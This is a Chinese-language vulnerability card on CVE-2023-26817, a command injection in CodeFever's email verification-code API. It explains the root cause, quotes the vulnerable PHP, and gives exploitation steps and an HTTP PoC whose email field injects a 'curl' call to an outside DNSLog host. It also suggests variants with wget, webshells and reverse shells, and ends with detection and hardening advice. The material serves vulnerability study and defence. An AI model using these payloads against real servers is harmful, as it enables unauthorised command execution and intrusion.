---
id: web-php-rce-codefever-email-command-injection
title: CodeFever 邮箱验证码接口命令注入：邮箱参数过正则后拼进 Mail::send 的 exec 实现 RCE（CVE-2023-26817）
type: scenario
domain: web
path: web/php/rce
technique: codefever-email-command-injection
tags:
- codefever
- command-injection
- php
- rce
- email
- cve-2023-26817
cve:
- CVE-2023-26817
severity: critical
confidence: medium
status: verified
created: '2026-11-11'
updated: '2026-11-11'
verification:
  verified_by: verifier-V536
  verified_at: '2026-11-11T18:39:22+08:00'
  notes: '已对照原文核对 CodeFever 链路：application/controllers/api/user.php 的 resentCommitEmailCode_post 仅以 preg_match(''/^\w+([.-]?\w+)*@\w+([.-]?\w+)*(\.\w{2,3})+$/'', email) 校验（未拒绝单引号/控制字符，PCRE 的 $ 可匹配末尾换行前），随后 EmailSender::send → Mail::send，后者用 Command::run([''echo'',''-e'',wrapArgument(body),''|'',''mail'',''-r'',wrapArgument(from),''-s'',wrapArgument(title),wrapArgument(to),''> /dev/null &'']) 发送（原文同时保留注释掉的 exec 拼接旧实现），与原文字面一致；原文 payload 1@qq.com''xx|curl target;xx''xx 卡片引用一致；CVE-2023-26817 对应原文引用的 PGYER/codefever issue #140。原文未给受影响版本区间，affected_versions 保持为空未猜。接口路径 /api/user/resentCommitEmailCode 为版本/框架推断，卡片已注明『以实际路由为准』。dedup 0 duplicate，与 phpmailer/exim、Strapi 等不同产品不同注入点。保留。'
url: /docs/web/php/rce/web-php-rce-codefever-email-command-injection/
draft: false
kb_aliases:
- CodeFever 命令注入
- CVE-2023-26817
- codefever resentCommitEmailCode
- 邮箱参数命令注入
- Mail::send exec 注入
---

## 一句话结论

CodeFever 社区版 `application/controllers/api/user.php` 的邮箱验证码接口只用一条允许尾部边界松动的正则校验 email，随后把 email 原样传入 `Mail::send()`——后者用 `exec` 拼接 `mail` 命令发送邮件且参数转义不完整；在邮箱后闭合引号并拼接 `|`、`;` 等 shell 元字符，即可在服务器上执行任意命令（CVE-2023-26817）。

## 原理

- 入口接口 `resentCommitEmailCode_post()` 从已登录用户的请求体取 `email`，仅做 `preg_match('/^\w+([.-]?\w+)*@\w+([.-]?\w+)*(\.\w{2,3})+$/', $email)` 校验便继续调用 `EmailSender::send()`。
- `Mail::send()` 把收件人、标题、正文包装成命令数组交给 `Command::run()`（内部走 shell 命令拼接/`exec`）：`echo -e <body> | mail -r <from> -s <title> <to>`。若 `Command::wrapArgument()` 只做加引号而不转义参数内部的单引号/shell 元字符，攻击者提供的 email 就能闭合引号，从其后的 `|`、`;`、`&&` 处注入任意命令。
- 正则本身也不够严：`$` 锚点在 PCRE 中可以匹配字符串末尾的换行之前，构造“合法邮箱 + 换行 + 注入串”即可同时通过校验并让换行后的内容进入命令拼接；此外域名后的额外字符、引号等也未被显式拒绝。
- 之所以成立：把用户输入交给 shell 字符串而不是 argv 数组执行（或虽用数组但包装函数未严格转义），这是典型的命令注入；邮箱字段是唯一需要“看起来像数据”的输入，正则给了虚假的安全感。
- 文章利用该漏洞在“最新版本、历史漏洞未修”的 CodeFever 上直接拿 flag（赛后复现），说明漏洞影响范围取决于版本是否包含修复提交。

## 触发条件

- 目标暴露 CodeFever 社区版，且 `resentCommitEmailCode` 一类邮箱验证码接口可用；通常需要一个已登录的低权限账号（接口从 authData 取用户信息，但只用于取 u_key，不限制普通用户调用）。
- 版本存在 CVE-2023-26817（社区版历史版本；文章称最新版本仍未修复该历史漏洞，需按实际版本确认）。
- `Mail::send` 走的邮件发送命令在目标环境可执行（安装并配置了 `mail`/MTA），且 PHP 的 `exec`/命令执行未被禁用。
- 服务器可出网或可回连，便于验证命令执行（如 curl 回显、DNSLog）。

## 利用步骤

1. 注册/登录一个 CodeFever 账号，抓取邮箱验证码接口请求（`/api/user/resentCommitEmailCode` 一类路径，以实际路由为准）。
2. 在 `email` 字段构造“合法邮箱 + 注入串”：先用合法邮箱确认通道正常，再在其后加换行与闭合引号 + `|`/`;` + 命令 + 注释符，例如 `1@qq.com'xx|curl <dnslog>;xx'xx`（原文 payload）。
3. 观察服务器侧是否触发命令（DNSLog/回连记录），确认注入成功。
4. 换成读取命令或反弹 shell，完成利用；注意该接口会实际触发邮件发送流程，命令在 `mail` 管道执行。
5. 若注入点需要绕过正则，尝试在邮箱后插入 `\n`（URL 编码 `%0a`）让 `$` 锚点提前匹配，再把注入串放在换行之后。

## PoC

```php
// 漏洞入口（原文片段，路径 application/controllers/api/user.php）
$email = $data['email'];
if (!preg_match('/^\w+([.-]?\w+)*@\w+([.-]?\w+)*(\.\w{2,3})+$/', $email)) {
    Response::reject(0x0201);
}
EmailSender::send($email, '【CodeFever Community】验证电子邮件地址', ...);
```

```php
// 承载注入的发送逻辑（原文片段）
$result = [];
Command::run([
    'echo', '-e', Command::wrapArgument($body), '|',
    'mail', '-r', Command::wrapArgument($from),
    '-s', Command::wrapArgument($title), Command::wrapArgument($to),
    '> /dev/null &'
], $result);
```

```http
POST /api/user/resentCommitEmailCode HTTP/1.1
Host: <target>
Content-Type: application/json
Cookie: <已登录会话>

{"email":"1@qq.com'xx|curl http://<dnslog>;xx'xx"}
```

## 变体与关联

- 变体：把 `curl` 换成 `wget`、`nslookup`、写 webshell 或反弹 shell；若有回显限制，用 DNSLog 先行确认。
- 变体：同类“邮箱/通知参数拼 shell”的注入出现在很多自建 Git/CI 平台的通知、找回密码、邀请成员功能，测试思路一致。
- 关联：[[web-php-rce-phpmailer-exim-be-expansion-command-exec]]（邮件组件参数注入）、[[web-php-rce-disable-functions-ld-preload]]（命令执行被限制时的后续绕过）。
- 边界：若版本已修复（`Command::wrapArgument` 严格转义或改用 argv 数组且不经 shell）、接口要求管理员权限、或 mail 命令不可用，则链断开；正则对换行的处理依赖 PCRE 默认行为。

## 检测与防御

- **检测**：请求体 `email` 字段含 `'`、`"`、`|`、`;`、`&&`、`$(`、换行等异常字符；Web 日志中出现形如 `xxx@xxx'...` 的邮箱；服务器侧出现由 Web 进程（www-data）发起的 `curl`/`wget`/`sh` 子进程与异常外连；邮件发送命令的异常参数。
- **防御**：邮箱字段用严格白名单校验并拒绝控制字符；把用户输入作为 argv 数组参数传递、不经过 shell；`Command::wrapArgument` 使用完整转义（如 `escapeshellarg`）；升级到修复版本；限制 Web 进程的出网与命令执行能力。
- **加固**：`disable_functions` 禁用不必要的命令执行函数；邮件发送改为 SMTP 库而非调 `mail` 命令；对验证码/通知接口做频率限制。
